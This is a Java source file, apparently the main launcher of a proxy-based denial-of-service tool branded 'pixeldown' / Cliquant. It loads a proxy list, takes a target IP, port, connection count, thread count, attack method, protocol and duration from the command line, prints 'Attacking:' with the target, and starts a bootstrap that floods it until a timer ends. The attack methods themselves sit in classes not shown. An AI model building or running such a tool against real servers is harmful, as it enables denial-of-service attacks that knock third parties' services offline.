package lv.cliquant;

import lv.cliquant.Loaders.ProxyLoader;
import lv.cliquant.Loaders.SelMethod;
import lv.cliquant.Loaders.SetupMethods;

import java.io.File;

public class Main {
    public static ProxyLoader Loader = new ProxyLoader();

    public static SelMethod methodSelector;

    public static SetupMethods setup = new SetupMethods();

    public static int protocol;

    public static int port;

    public static String ip;

    public static void main(String[] args) throws Exception, Throwable {
        if (args.length != 7) {
            System.err.println("[ERROR] Usage: java -jar " + (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI())).getName() + " ip= port= connections= threads= method= protocol= seconds=");
            System.out.println("");
            System.err.println("Closing...");
            System.exit(0);
        }
        Loader.loadProxies();
        ip = args[0].split("=")[1];
        port = Integer.parseInt(args[1].split("=")[1]);
        String pretimeout = args[6].split("=")[1] + "000";
        protocol = Integer.parseInt(args[5].split("=")[1]);
        int timeout = Integer.parseInt(pretimeout);
        String method = args[4].split("=")[1];
        setup.setup();
        methodSelector = setup.setMethod(method);
        (new Thread(() -> {
            try {
                Thread.sleep(timeout);
                System.out.println("Closing...");
                System.exit(0);
            } catch (Exception exception) {}
        })).start();
        System.out.println("Attacking: " + ip + ":" + port);
        try {
            (new BootStrap()).Start(ip, port, Integer.parseInt(args[2].split("=")[1]), Integer.parseInt(args[3].split("=")[1]));
        } catch (Exception exception) {}
    }
}

// © 2022 Copyright www.pixeldown.ml - Cliquant